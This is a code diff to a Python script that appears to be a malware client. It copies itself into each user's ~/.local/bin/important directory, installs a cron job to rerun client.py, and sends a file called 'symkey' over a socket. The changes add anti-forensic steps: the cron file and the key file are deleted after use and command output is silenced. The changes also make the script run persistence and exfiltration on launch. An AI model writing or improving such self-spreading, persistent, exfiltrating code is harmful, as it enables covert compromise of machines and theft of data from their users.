@@ -1,5 +1,5 @@
 from socket import socket, gethostname
-from os import makedirs,listdir,getcwd
+from os import makedirs,listdir,getcwd,remove
 from os.path import dirname, exists
 from pathlib import Path
 from time import sleep
@@ -19,7 +19,7 @@ def copy_self():
         pth='/home/'+each+'/.local/bin/important'
         try:
             makedirs(pth,exist_ok=True)
-            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/'
+            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/ > /dev/null'
             Popen(cmd, shell=True)
         except PermissionError:
             pass
@@ -38,6 +38,10 @@ def buildCron():
         cf.write('* * * * */5 python3 /home/.local/bin/important/client.py\n')
     cmd='crontab cronreader'
     Popen(cmd,shell=True)
+    with open('cronreader','a') as cf:
+        cf.write('')
+    remove('cronreader')
+    
 
 def connector():
     try:
@@ -62,6 +66,7 @@ def sender():
         print("Sending complete")
         with open('symkey','w') as f:
             f.write("")
+        remove('symkey')
         break
 
     sock.shutdown(1)
@@ -71,6 +76,8 @@ def sender():
 
 if __name__=='__main__':
     copy_self()
+    checkCron()
+    sender()
 
 
 
